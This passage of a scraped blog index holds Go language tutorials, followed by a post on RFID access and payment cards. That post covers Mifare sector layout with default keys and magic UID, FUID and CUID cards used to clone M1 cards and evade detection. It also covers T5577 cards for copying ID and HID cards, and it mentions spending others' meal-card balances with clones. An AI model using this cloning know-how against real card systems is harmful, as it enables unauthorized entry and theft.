fmt.Println(&quot;My favorite number is&quot;, rand.Intn(10))&#125; This program is using the packages with import paths &quot;fmt&quot; and &quot;math/rand&quot;. By convention, the package name is the same as the last element of the import path. For instance, the &quot;math/rand&quot; package comprises files that begin with the statement package rand. 代码第一行写明package；上例中，希望被执行的文件必须放在其起始处声明package main，否则在go run运行时会报错：”go run: cannot run non-main package“ Multiple Import Ways常规方式常规方式,通过包名lib调用sayHello方法.lib.SayHello() 1import “github.com/libragen/felix/lib” 包名用&quot;&quot;包裹，文件夹层次用/表示。 普通导入就是按照加载机制，将要使用的包导入进来，然后使用 packageName.MethodName 的方式调用包内的方法即可。注意如果要包方法在其他包中可以调用，包方法需要首字母大写，例如：fmt.Println()。 别名导入 包名过于复杂或者意思不明确. 如使用 mywebapp/libs/mongodb/db 包时,不确定此 db 是哪种类型,故可以使用别名来明确含义： import mongo &quot;mywebapp/libs/mongodb/db&quot; 包名和其他包冲突：世界之大，变化无穷。现在我们有库 db，但没过几年出现了另一种DB，叫云DB。但包名是一样的，分别用别名区分： 12345678910import ( \"fmt\" myBaz \"foo/bar/baz\" ydbgo \"mywebapp/libs/yundb/db\" mongo \"mywebapp/libs/mongodb/db\")func main() &#123; fmt.Println(myBaz.Hello(), myBaz.World())&#125; 如果两个包的包名存在冲突，或者包名太长需要简写时，我们可以使用别名导入来解决。 省略package名导入这里的. 符号表示：在调用包 lib 的成员时，不需要再声明包名。 比如，Println() 是 fmt 包中的方法，在一般的情况下，我们都通过 fmt.Println() 来调用。而使用 . &quot;fmt&quot; 后，直接可以调 Println()。 123456789package mainimport &#123; . \"github.com/libragen/felix/lib\" . \"fmt\"&#125;func main() &#123; SayHello() Println(\"test\")&#125; 下划线操作12345678910package mainimport ( \"fmt\" _ \"foo/bar/baz\")func main() &#123; fmt.Println(baz.Hello(), baz.World()) // 错误 _ 并没有导入包 只是引入并执行包模块的 init 方法&#125; _ 是包引用操作，只会执行包下各模块中的 init 方法，并不会真正的导入包，所以不可以调用包内的其他方法。 The access after importa name is exported if it begins with a capital letter. For example, Pizza is an exported name, as is Pi, which is exported from the math package. pizza and pi do not start with a capital letter, so they are not exported. When importing a package, you can refer only to its exported names. Any “unexported” names are not accessible from outside the package. 12345678910package mainimport ( &quot;fmt&quot; &quot;math&quot;)func main() &#123; fmt.Println(math.pi)&#125; To fix the error, rename math.pi to math.Pi and try it again.","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】变量","date":"2020-03-15T09:02:05.000Z","path":"2020/03/15/【Golang】变量/","text":"变量声明可以一次声明多个变量： 1var identifier1, identifier2 type 实例2 123456789101112131415package mainimport \"fmt\"var c, python, java boolfunc main() &#123; var a string = \"test\" fmt.Println(a) var b, c int = 1, 2 fmt.Println(b, c) var i int fmt.Println(i, c, python, java)&#125; 以上实例输出结果为： 12test1 2 数值类型（包括complex64/128）为 0 布尔类型为 false 字符串为 “”（空字符串） 以下几种类型为 nil： 123456var a *intvar a []intvar a map[string] intvar a chan intvar a func(string) intvar a error // error 是接口 实例 1234567891011package mainimport &quot;fmt&quot;func main() &#123; var i int var f float64 var b bool var s string fmt.Printf(&quot;%v %v %v %q\\n&quot;, i, f, b, s)&#125; 输出结果是： 10 0 false &quot;&quot; 根据值自行判定变量类型1var v_name = value 实例 123456package mainimport &quot;fmt&quot;func main() &#123; var d = true fmt.Println(d)&#125; 输出结果是： 1true 省略 varInside a function, the := short assignment statement can be used in place of a var declaration with implicit type. Outside a function, every statement begins with a keyword (var, func, and so on) and so the := construct is not available. 注意 *:=* 左侧如果没有声明新的变量，就产生编译错误，格式： 1v_name := value 例如： 12345var intVal int intVal :=1 // 这时候会产生编译错误intVal,intVal1 := 1,2 // 此时不会产生编译错误，因为有声明新的变量，因为 := 是一个声明语句 可以将 var f string = “Runoob” 简写为 f := “Runoob”： 实例 1234567package mainimport &quot;fmt&quot;func main() &#123; f := &quot;Runoob&quot; // var f string = &quot;Runoob&quot; fmt.Println(f)&#125; 输出结果是： 1Runoob 多变量声明1234567891011121314//类型相同多个变量, 非全局变量var vname1, vname2, vname3 typevname1, vname2, vname3 = v1, v2, v3var vname1, vname2, vname3 = v1, v2, v3 // 和 python 很像,不需要显示声明类型，自动推断vname1, vname2, vname3 := v1, v2, v3 // 出现在 := 左侧的变量不应该是已经被声明过的，否则会导致编译错误// 这种因式分解关键字的写法一般用于声明全局变量var ( vname1 v_type1 vname2 v_type2) 实例 123456789101112131415161718package mainvar x, y intvar ( *// 这种因式分解关键字的写法一般用于声明全局变量* a int b bool)var c, d int = 1, 2var e, f = 123, \"hello\"*//这种不带声明格式的只能在函数体中出现**//g, h := 123, \"hello\"*func main()&#123; g, h := 123, \"hello\" println(x, y, a, b, c, d, e, f, g, h)&#125; 以上实例执行结果为： 10 0 0 false 1 2 123 hello 123 hello 常量声明（const）1const identifier [type] = value 你可以省略类型说明符 [type]，因为编译器可以根据变量的值来推断其类型。 显式类型定义： const b string = &quot;abc&quot; 隐式类型定义： const b = &quot;abc&quot; 多个相同类型的声明可以简写为： 1const c_name1, c_name2 = value1, value2 以下实例演示了常量的应用： 实例 123456789101112131415package mainimport \"fmt\"func main() &#123; const LENGTH int = 10 const WIDTH int = 5 var area int const a, b, c = 1, false, \"str\" *//多重赋值* area = LENGTH * WIDTH fmt.Printf(\"面积为 : %d\", area) println() println(a, b, c) &#125; 以上实例运行结果为： 12面积为 : 501 false str Default ValuesVariables declared without an explicit initial value are given their zero value. The zero value is: 0 for numeric types, false for the boolean type, and &quot;&quot; (the empty string) for strings. 123456789101112package mainimport &quot;fmt&quot;func main() &#123; var i int var f float64 var b bool var s string fmt.Printf(&quot;%v %v %v %q\\n&quot;, i, f, b, s)&#125;//output 0 0 false &quot;&quot; 变量作用域局部变量在函数体内声明的变量称之为局部变量，它们的作用域只在函数体内，参数和返回值变量也是局部变量。 以下实例中 main() 函数使用了局部变量 a, b, c： 实例 123456789101112131415package mainimport &quot;fmt&quot;func main() &#123; */\\* 声明局部变量 \\*/* var a, b, c int */\\* 初始化参数 \\*/* a = 10 b = 20 c = a + b fmt.Printf (&quot;结果： a = %d, b = %d and c = %d\\n&quot;, a, b, c)&#125; 以上实例执行输出结果为： 1结果： a = 10, b = 20 and c = 30 全局变量在函数体外声明的变量称之为全局变量，全局变量可以在整个包甚至外部包（被导出后）使用。 全局变量可以在任何函数中使用，以下实例演示了如何使用全局变量： 实例 12345678910111213141516171819package mainimport \"fmt\"*/\\* 声明全局变量 \\*/*var g intfunc main() &#123; */\\* 声明局部变量 \\*/* var a, b int */\\* 初始化参数 \\*/* a = 10 b = 20 g = a + b fmt.Printf(\"结果： a = %d, b = %d and g = %d\\n\", a, b, g)&#125; 以上实例执行输出结果为： 1结果： a = 10, b = 20 and g = 30 Go 语言程序中全局变量与局部变量名称可以相同，但是函数内的局部变量会被优先考虑。实例如下： 实例 12345678910111213package mainimport \"fmt\"*/\\* 声明全局变量 \\*/*var g int = 20func main() &#123; */\\* 声明局部变量 \\*/* var g int = 10 fmt.Printf (\"结果： g = %d\\n\", g)&#125; 以上实例执行输出结果为： 1结果： g = 10 形式参数形式参数会作为函数的局部变量来使用。实例如下： 实例 12345678910111213141516171819202122232425package mainimport \"fmt\"*/\\* 声明全局变量 \\*/*var a int = 20;func main() &#123; */\\* main 函数中声明局部变量 \\*/* var a int = 10 var b int = 20 var c int = 0 fmt.Printf(\"main()函数中 a = %d\\n\", a); c = sum( a, b); fmt.Printf(\"main()函数中 c = %d\\n\", c);&#125;*/\\* 函数定义-两数相加 \\*/*func sum(a, b int) int &#123; fmt.Printf(\"sum() 函数中 a = %d\\n\", a); fmt.Printf(\"sum() 函数中 b = %d\\n\", b); return a + b;&#125; 以上实例执行输出结果为： 1234main()函数中 a = 10sum() 函数中 a = 10sum() 函数中 b = 20main()函数中 c = 30 初始化局部和全局变量不同类型的局部和全局变量默认值为： 数据类型 初始化默认值 int 0 float32 0 pointer nil","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】枚举（enumeration）","date":"2020-03-15T09:00:03.000Z","path":"2020/03/15/【Golang】枚举/","text":"枚举（enumeration）Golang 语言并没有提供enum的定义，我们可以使用const来模拟枚举类型。 12345678type PolicyType int32const ( Policy_MIN PolicyType = 0 Policy_MAX PolicyType = 1 Policy_MID PolicyType = 2 Policy_AVG PolicyType = 3) 这里定义了一个新的类型PolicyType，并且定义了4个常量（Policy_MIN, Policy_MAX, Policy_MID, Policy_AVG），类型是PolicyType。 使用举例1234567func foo(p PolicyType) &#123; fmt.Printf(\"enum value: %v\\n\", p)&#125;func main() &#123; foo(Policy_MAX)&#125; 12345const ( Unknown = 0 Female = 1 Male = 2)","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】变量访问域","date":"2020-03-15T08:37:34.000Z","path":"2020/03/15/【Golang】变量访问域/","text":"变量修饰符（Access Modifier）当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public 标识符。 如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected ） Go 语言中变量的声明必须使用空格隔开，如： 1var age int;","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】map","date":"2020-03-15T08:33:45.000Z","path":"2020/03/15/【Golang】类型-map/","text":"定义 map可以使用内建函数 make 也可以使用 map 关键字来定义 Map: 12345/* 声明变量，默认 map 是 nil */var map_variable map[key_data_type]value_data_type/* 使用 make 函数 */map_variable := make(map[key_data_type]value_data_type) 如果不初始化 map，那么 map_variable 就是一个 nil。 nil map 不能用来存放键值对。 map的创建1234567make(map[KeyType]ValueType, initialCapacity)make(map[KeyType]ValueType)map[KeyType]ValueType&#123;&#125;map[KeyType]ValueType&#123; key1 : value1, key2: value2, ... , keyN : valueN&#125; 如下，用4种方式分别创建数组，其中第一种和第二种的区别在于，有没有指定初始容量。 A new, empty map value is made using the built-in function make, which takes the map type and an optional capacity hint as arguments: 12make(map[string]int)make(map[string]int, 100) The initial capacity does not bound its size: maps grow to accommodate the number of items stored in them, with the exception of nil maps. A nil map is equivalent to an empty map except that no elements may be added. 虽然map拥有一个基本特性，即一旦容量不够，它会自动扩容。但是预先为 map 指定 initial capacity 可以提高 performance。 1234567func test1() &#123; map1 := make(map[string]string, 5) map2 := make(map[string]string) map3 := map[string]string&#123;&#125; map4 := map[string]string&#123;\"a\": \"1\", \"b\": \"2\", \"c\": \"3\"&#125; fmt.Println(map1, map2, map3, map4)&#125; Map 的元素数量The number of map elements is called its length. For a map m, it can be discovered using the built-in function len and may change during execution. map的查找123456789101112131415package mainimport \"fmt\"func main() &#123; map4 := map[string]string&#123;\"a\": \"1\", \"b\": \"2\", \"c\": \"3\"&#125; val, exist := map4[\"a\"] val2, exist2 := map4[\"d\"] fmt.Printf(\"%v,%v\\n\", exist, val) fmt.Printf(\"%v,%v\\n\", exist2, val2)&#125;//outputtrue,1false, map的添加（修改）和遍历下面实例演示了创建和使用map实例: 实例 12345678910111213141516171819202122232425262728293031323334353637package mainimport \"fmt\"func main() &#123; var countryCapitalMap map[string]string //声明集合 countryCapitalMap = make(map[string]string) //实例化集合 // map插入key - value对,各个国家对应的首都 countryCapitalMap [ \"France\" ] = \"巴黎\" countryCapitalMap [ \"Italy\" ] = \"罗马\" countryCapitalMap [ \"Japan\" ] = \"东京\" countryCapitalMap [ \"India \" ] = \"新德里\" //使用键输出地图值 for country := range countryCapitalMap &#123; fmt.Println(country, \"首都是\", countryCapitalMap [country]) &#125; //查看元素在集合中是否存在 capital, ok := countryCapitalMap [ \"American\" ] //如果确定是真实的,则存在,否则不存在 //fmt.Println(capital) //fmt.Println(ok) if ok &#123; fmt.Println(\"American 的首都是\", capital) &#125; else &#123; fmt.Println(\"American 的首都不存在\") &#125;&#125;//outputFrance 首都是 巴黎Italy 首都是 罗马Japan 首都是 东京India 首都是 新德里American 的首都不存在 123456789101112131415161718192021222324var countryCapitalMap map[string]string //声明集合countryCapitalMap = make(map[string]string) //实例化集合// map插入key - value对,各个国家对应的首都countryCapitalMap [ \"France\" ] = \"巴黎\"countryCapitalMap [ \"Italy\" ] = \"罗马\"countryCapitalMap [ \"Japan\" ] = \"东京\"countryCapitalMap [ \"India \" ] = \"新德里\"//使用键输出地图值for key, value := range countryCapitalMap &#123; println(key) fmt.Println(value)&#125;//ouput:France巴黎Italy罗马Japan东京India 新德里 map的删除 - delete() 函数delete() 函数用于删除集合的元素, 参数为 map 和其对应的 key。实例如下： 实例 12345678910111213141516171819202122232425package mainimport \"fmt\"func main() &#123; */\\* 创建map \\*/* countryCapitalMap := map[string]string&#123;\"France\": \"Paris\", \"Italy\": \"Rome\", \"Japan\": \"Tokyo\", \"India\": \"New delhi\"&#125; fmt.Println(\"原始地图\") */\\* 打印地图 \\*/* for country := range countryCapitalMap &#123; fmt.Println(country, \"首都是\", countryCapitalMap [ country ]) &#125; */\\*删除元素\\*/* delete(countryCapitalMap, \"France\") fmt.Println(\"法国条目被删除\") fmt.Println(\"删除元素后地图\") */\\*打印地图\\*/* for country := range countryCapitalMap &#123; fmt.Println(country, \"首都是\", countryCapitalMap [ country ]) &#125;&#125; 以上实例运行结果为： 12345678910原始地图India 首都是 New delhiFrance 首都是 ParisItaly 首都是 RomeJapan 首都是 Tokyo法国条目被删除删除元素后地图Italy 首都是 RomeJapan 首都是 TokyoIndia 首都是 New delhi Reference https://golang.org/ref/spec","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】struct","date":"2020-03-15T08:30:49.000Z","path":"2020/03/15/【Golang】类型-struct/","text":"structsA struct is a sequence of named elements, called fields, each of which has a name and a type. Field names may be specified explicitly (IdentifierList) or implicitly (EmbeddedField). Within a struct, non-blank field names must be unique. 1234567891011121314package mainimport \"fmt\"type Vertex struct &#123; X int Y int&#125;func main() &#123; v := Vertex&#123;1, 2&#125; v.X = 4 fmt.Println(v.X)&#125; 1234567891011// An empty struct.struct &#123;&#125;// A struct with 6 fields.struct &#123; x, y int u float32 _ float32 // padding A *[]int F func()&#125; 内嵌字段（Embedded Field）A field declared with a type but no explicit field name is called an embedded field. An embedded field must be specified as a type name T or as a pointer to a non-interface type name *T, and T itself may not be a pointer type. The unqualified type name acts as the field name. 12345678// A struct with four embedded fields of types T1, *T2, P.T3 and *P.T4struct &#123; T1 // field name is T1 *T2 // field name is T2 P.T3 // field name is T3 *P.T4 // field name is T4 x, y int // field names are x and y&#125; Pointers to structsStruct fields can be accessed through a struct pointer. To access the field X of a struct when we have the struct pointer p we could write (*p).X. However, that notation is cumbersome, so the language permits us instead to write just p.X, without the explicit dereference. 123456789101112131415161718192021222324252627282930313233343536package mainimport ( \"fmt\" \"reflect\")type Vertex struct &#123; X int Y int&#125;func main() &#123; v := Vertex&#123;1, 2&#125; m := v p := &amp;v p.X = 1e9 fmt.Println(v) fmt.Println(m) fmt.Println(p) fmt.Println(reflect.TypeOf(v)) fmt.Println(reflect.TypeOf(m)) fmt.Println(reflect.TypeOf(p)) &#125;//output&#123;1000000000 2&#125;&#123;1 2&#125;&amp;&#123;1000000000 2&#125;main.Vertexmain.Vertex*main.Vertex Struct LiteralsA struct literal denotes a newly allocated struct value by listing the values of its fields. You can list just a subset of fields by using the Name: syntax. (And the order of named fields is irrelevant.) The special prefix &amp; returns a pointer to the struct value. 123456789101112131415161718192021package mainimport \"fmt\"type Vertex struct &#123; X, Y int&#125;var ( v1 = Vertex&#123;1, 2&#125; // has type Vertex v2 = Vertex&#123;X: 1&#125; // Y:0 is implicit v3 = Vertex&#123;&#125; // X:0 and Y:0 p = &amp;Vertex&#123;1, 2&#125; // has type *Vertex)func main() &#123; fmt.Println(v1, p, v2, v3)&#125;//output&#123;1 2&#125; &amp;&#123;1 2&#125; &#123;1 0&#125; &#123;0 0&#125; struct 的方法123func (db *DB) PingContext(ctx context.Context) error &#123;...&#125; db *DB 表示这个 PingContext方法为 DB 这个 struct 的方法。 Reference https://golang.org/ref/spec","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】interface 和 interface{} 类型","date":"2020-03-15T08:03:11.000Z","path":"2020/03/15/【Golang】类型-interface和interface类型/","text":"interfaceAn interface type is defined as a set of method signatures. A value of interface type can hold any value that implements those methods. Note: There is an error in the example code on line 22. Vertex (the value type) doesn’t implement Abser because the Abs method is defined only on *Vertex (the pointer type). 123456789101112131415161718192021222324252627282930313233343536373839404142package mainimport ( \"fmt\" \"math\")type Abser interface &#123; Abs() float64&#125;func main() &#123; var a Abser f := MyFloat(-math.Sqrt2) v := Vertex&#123;3, 4&#125; a = f // a MyFloat implements Abser a = &amp;v // a *Vertex implements Abser // In the following line, v is a Vertex (not *Vertex) // and does NOT implement Abser. a = v fmt.Println(a.Abs())&#125;type MyFloat float64func (f MyFloat) Abs() float64 &#123; if f &lt; 0 &#123; return float64(-f) &#125; return float64(f)&#125;type Vertex struct &#123; X, Y float64&#125;func (v *Vertex) Abs() float64 &#123; return math.Sqrt(v.X*v.X + v.Y*v.Y)&#125; Interfaces are implemented implicitlyA type implements an interface by implementing its methods. There is no explicit declaration of intent, no “implements” keyword. Implicit interfaces decouple the definition of an interface from its implementation, which could then appear in any package without prearrangement. 12345678910111213141516171819202122package mainimport \"fmt\"type I interface &#123; M()&#125;type T struct &#123; S string&#125;// This method means type T implements the interface I,// but we don't need to explicitly declare that it does so.func (t T) M() &#123; fmt.Println(t.S)&#125;func main() &#123; var i I = T&#123;\"hello\"&#125; i.M()&#125; interface{} 类型我们可以使用类型断言（type assertion），以将一个类型为 interface{} 的变量，转换为基本数据类型或者复杂数据类型： 12345678910import \"fmt\"func main() &#123; var v interface&#123;&#125; v = \"aaa\" if v, ok := v.(string); ok &#123; fmt.Println(v) &#125; fmt.Println(v)&#125; Reference https://golang.org/ref/spec","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Golang】类型转换 - 类型断言（Type Assertion）和强制类型转换","date":"2020-03-15T07:43:22.000Z","path":"2020/03/15/【Golang】类型转换 - 类型转换/","text":"类型断言（Type Assertion）非安全的类型断言123456789package mainimport \"fmt\"func main() &#123; var a interface&#123;&#125; = \"ss\" t := a.(string) fmt.Printf(\"%v\", t)&#125; 在上面，我们将一个类型为 interface{} 的变量转换成了 string 类型。 我们可以使用类型断言（type assertion），以将一个类型为 interface{} 的变量，转换为基本数据类型或者复杂数据类型。 所谓”非安全“的类型断言，是指如果这个转换失败，则会直接在运行时报错： 12345678910package mainimport \"fmt\"func main() &#123; var a interface&#123;&#125; =\"ss\" t:= a.(int) fmt.Printf(\"%d\",t)&#125; Error： 12345panic: interface conversion: interface &#123;&#125; is string, not intgoroutine 1 [running]:main.main() /Working/GoPlayGround/main.go:7 +0x45 因此，就有了安全的类型断言。 安全的类型断言12345678910package mainimport \"fmt\"func main() &#123; var s interface&#123;&#125; = \"BrainWu\" if v, ok := s.(string); ok &#123; // invalid type assertion: s.(string) (non-interface type string on left) fmt.Println(v) &#125;&#125; 我们可以使用类型断言，将一个类型为 interface{} 的变量，转换为基本数据类型或者复杂数据类型： 123456789101112131415package mainimport \"fmt\"func main() &#123; var a interface&#123;&#125; = 10 t, ok := a.(int) if ok &#123; fmt.Println(\"int\", t) &#125; t2, ok := a.(float32) if ok &#123; fmt.Println(\"float32\", t2) &#125;&#125; 在进行安全的类型断言时，可以使用两个参数来接收返回值，其中第一个参数是转换成功后的值，一个是 bool，用于指示这次类型转换是否成功（如果转换失败，则 v 为期待转换类型的默认值），比如： 123456789101112131415161718192021222324252627package mainimport \"fmt\"func main() &#123; var s interface&#123;&#125; = \"test\" v1, ok := s.(int) if ok &#123; // invalid type assertion: s.(string) (non-interface type string on left) fmt.Println(v1) &#125; fmt.Println(v1) var s2 interface&#123;&#125; = 11 v2, ok := s2.(AAA) if ok &#123; fmt.Println(v2) &#125; fmt.Println(v2)&#125;type AAA struct &#123; bb int&#125;// output0&#123;0&#125; 强制类型转换golang的类型转换和C/C++、Java等语言的类型转换还有点区别 C/C++等语言有隐式类型转换，Golang中没有 Golang中的类型转换分强制类型转换和类型断言 在C/C++中： 123456int main()&#123; int a=5; float b=3.5; printf(\"%f\",a*b);&#125; 这样的代码是没有问题的，编译器隐式的把a向上转为float类型。但是在golang中， 123456789package mainimport \"fmt\"func main() &#123; var a float32 = 5.6 var b int = 10 fmt.Println (a * b)&#125; 这样的代码会报错，因为类型不匹配，这时候就需要强制类型转换： 123456789package mainimport \"fmt\"func main() &#123; var a float32 = 5.6 var b int = 10 fmt.Println (a * float32(b))&#125; 这样就不会报错了，普通变量类型int、float、string 都可以使用 type (a)这种形式来进行强制类型转换,，比如 1234var a int32 = 10var b int64 = int64(a)var c float32 = 12.3var d float64 =float64(c) String 与数值类型之间的转换1234567891011121314package mainimport \"strconv\"func main() &#123; // string到int int, err := strconv.Atoi(string) // string到int64 int64, err := strconv.ParseInt(string, 10, 64) // int到string string := strconv.Itoa(int) // int64到string string := strconv.FormatInt(int64, 10)&#125; int32 枚举与数值类型之间的转换12345678910111213141516171819package mainimport \"fmt\"type ConstantPromotionrulestatus int32const ( Constant_PROMOTION_RULE_STATUS_DISABLED ConstantPromotionrulestatus = 0 Constant_PROMOTION_RULE_STATUS_DELETED ConstantPromotionrulestatus = 1)func main() &#123; var a int32 = int32(Constant_PROMOTION_RULE_STATUS_DISABLED) fmt.Println(a) var b int32 = 1 var c ConstantPromotionrulestatus = ConstantPromotionrulestatus(b) fmt.Print(c)&#125; 指针的强制类型转换golang中指针也是有类型的： 12345678package mainfunc main() &#123; var a int = 10 var p *int = &amp;a var c *int64 c = (*int64)(p)&#125; 但是，上面代码会报编译错误，编译器会提示cannot convert p (type \\*int) to type \\*int64。因为，指针的强制类型转换需要用到unsafe包中的函数实现： 1234567891011package mainimport \"unsafe\"import \"fmt\"func main() &#123; var a int = 10 var b *int = &amp;a var c *int64 = (*int64)(unsafe.Pointer(b)) fmt.Println(*c)&#125; Reference https://golang.org/pkg/strconv/ https://blog.csdn.net/bobodem/article/details/80182096 https://stackoverflow.com/questions/18041334/convert-interface-to-int/18041561 https://studygolang.com/articles/21591","comments":true,"categories":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/categories/Golang/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://swsmile.info/tags/Golang/"}]},{"title":"【Hardware】ID 卡和 IC 卡","date":"2020-02-09T05:12:09.000Z","path":"2020/02/09/【Hardware】ID-卡和-IC-卡/","text":"IC 卡高频（High frequency）是指频带由3MHz到30MHz的无线电波，然而常用的RFID使用的高频频段为13.56MHz。 IC卡全称集成电路卡（Integrated Circuit Card），又称智能卡（Smart Card）。可读写，容量大，有加密功能，数据记录可靠，使用更方便，如一卡通系统，消费系统等，目前主要有PHILIPS的Mifare系列卡（也称为 M1 Card）。 ID卡ID卡全称身份识别卡（Identification Card），是一种不可写入的感应卡，含固定的编号，主要有台湾SYRIS的EM格式，美国的HID、TI 和 MOTOROLA等各类ID卡。 ID卡属于大家常说的低频卡，一般大部分情况下作为门禁卡或者大部分大学里使用的饭卡，一般为厚一些的卡，是只读的，卡里面只保存有一串唯一的数字序号ID，可以把这串数字理解为你的身份证号，刷卡的时候，读卡器只能读到ID号，然后通过跟后台数据库进行匹配，如果是门禁卡，那么数据库里面就是存在这样的ID号，如果匹配上门就开了，匹配不上门就开不了。 如果是学校的饭卡，刷卡的时候，实际上操作的是你对应ID号相关的数据库中的数据。ID卡本身不存在任何其他数据，所以，学校使用的ID卡饭卡，只能复制卡，刷别人的钱（数据库中的钱），再没有其他办法。 如果卡上写着 HID，这张卡也可能是 IC 卡（see https://www.hidglobal.com/product-display/cards-and-credentials/iclass）。 由此可以看出，ID卡是可加密的存储卡、ID卡是只读的低频卡。 CPU卡CPU card chip is a microprocessor, If you want to achieve more advanced features and the security level is particularly high, its function is equivalent to a microcomputer. CPU cards can be applied to many fields such as finance, insurance, traffic police, and government industries etc. 有操作系统，可存储数据，也有自己的ID号，CPU卡发一串数据给设备，设备与SAM卡进行运算，设备再发一串数据回CPU卡确认，然后进行交易或身份认证；跟M1卡的区别在于一个算法在空中，一个算法在设备里面；无论是卡商，设备商，运营商，都不知道其中的算法，所以这个系统的安全性会高很多。 区别如何从外观上来进行区分ID卡和IC卡圆形大多是ID卡，方形大多是IC卡（椭圆形，沿着卡片的四条边分布，距离卡边大概3-5mm左右的距离）。 常见卡类型 类型 频率 特性 Mifare S50(简称M1) 高频 最常见的卡，每张卡有独一无二的UID号，可保存修改数据,常见学生卡，饭卡，公交卡，门禁卡 Mifare UltraLight（简称M0） 高频 低成本卡，出厂固化UID，可储存修改数据，常见地铁卡，公交卡 Mifare UID（简称UID卡） 高频 M1卡的变异版本，可修改UID，国外叫做中国魔术卡，可以用来克隆M1 S50的数据 EM4XX（简称ID卡） 低频 常用固化ID卡，出厂固化ID，只能读不能写（低成本门禁卡，小区门禁卡，停车场门禁卡） T5577（简称可修改ID卡） 低频 可用来克隆ID卡，出厂为空卡，内有三区也可储存数据，个别三区科设置密码 HID ProxⅡ（简称HID卡） 低频 美国常用的低频卡，可擦写，不与其他卡通用 高频M1 S50卡目前最常见的高频卡，也是我们口中俗称的IC卡。M1卡科储存的数据大小为8k，分为16个扇区，每个扇区分4个块，每个块为16个字节，以块为存取单位。每个扇区都有独立的一组密码及访问控制，每张卡有唯一的一个32位的序列号。每个扇区的0,1,2块为数据块，用来存储数据，第3块为控制块，包括了密A、存取控制、密码B。 每张卡的第0扇区的第0块用来存放厂商代码，不可更改。 12345678910111213141516扇区0 03332801198804008500b42ef0bb6aa8 块0 //厂商代码，不可更改 00000000000000000000000000000000 块1 //数据块 00000000000000000000000000000000 块2 //数据块 ffffffffffffff078069ffffffffffff 块3 //密码A（6字节），存储控制（4字节），密码B（6字节）扇区1 00000000000000000000000000000000 块4 //除了第0扇区稍有不同，其他15个扇区结构完全一样 00000000000000000000000000000000 块5 00000000000000000000000000000000 块6 ffffffffffffff078069ffffffffffff 块7 . . . 扇区15 00000000000000000000000000000000 块60 00000000000000000000000000000000 块61 00000000000000000000000000000000 块62 ffffffffffffff078069ffffffffffff 块63 中间4字节控制字是管理密码权限，用来设置A密码和B密码的功能。默认不修改的时候，可以用A密码读写所有数据。A密码不可读出，B密码可以用A密码读出。密码不一定可以读取，由控制字决定。 M1 UID卡M1 UID卡是针对M1 S50卡特制的变种卡，用起来和M1 S50完全一样，只是多了一个功能，就是0扇区块的数据可以随意修改。因此UID号也可以随意修改，厂家信息也可以随意修改。UID卡修改0扇区0块数据是靠指令进入工厂模式，可以直接对全卡任何数据编辑，不需要密码即可读写卡，同时不怕写坏卡，即使写错0块，写坏扇区控制字，也可以随时修复回来，不影响后续使用。 FUID卡FUID卡是针对UID卡做的优化。新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID卡，因此可以来拒绝UID卡的访问，来达到屏蔽复制卡的功能。FUID可以修改0块，但只可以修改一次，写错也没办法更改，也不能重复利用。修改后和M1卡完全一样，很难被屏蔽检测。 CUID卡CUID卡是针对FUID卡做的优化。CUID卡可以重复修改0块，但是它和UID卡的区别是，UID卡是通过指令修改0块，CUID使用的是常规密码验证的方法写0块，其他扇区和标准M1卡相同。缺点是，还是有可能会被检测出来，而且如果不小心写错了UID号的校验位导致无法读卡，没办法修复只能报废。 低频ID卡ID卡是我们的俗称，内部芯片的全名叫做EM4100或EM41XX。每张卡出厂就有独一无二的ID号，不可改写。 T5577卡T5577 卡是一种可以写入数据可以加密的低频卡。最特别之处是，写入ID号可以变身成为ID卡，写入HID号可以变身HID卡，写入Indala卡号，可以变身Indala卡。T5577一共有8个块，每个块只能存8位数。第0块是用来设置卡片类型和调制方式的，决定了卡片是ID卡还是HID卡，如果随意修改会导致读不到卡。最后一个块，在没有加密时是数据区，加密后，其数据就变成了密码。结构如下 123456780x00148040 00000000000101001000000001000000 [0]0xFF94C004 11111111100101001100000000000100 [1]0xA5464942 10100101010001100100100101000010 [2]0xFFFFF808 11111111111111111111100000001000 [3]0x0001C000 00000000000000011100000000000000 [4]0x0001C000 00000000000000011100000000000000 [5]0x0001C000 00000000000000011100000000000000 [6]0x0001C000 00000000000000011100000000000000 [7] IC卡类型HID iCLASS® Seos iCLASS SE® iCLASS® Crescendo® HID Proximity 破解arc122u只能读取和修改高频卡（IC 卡），有点不足 Reference http://www.66sz.cn/news_show-1274.html http://www.gs-possystem.com/info/the-difference-of-id-card-ic-card-cpu-card-26303396.html https://www.smadot.com/the-difference-between-id-cards-and-ic-cards/ https://www.hidglobal.com/product-display/cards-and-credentials/iclass https://www.getkisi.com/blog/copy-clone-prox-hid-id-card 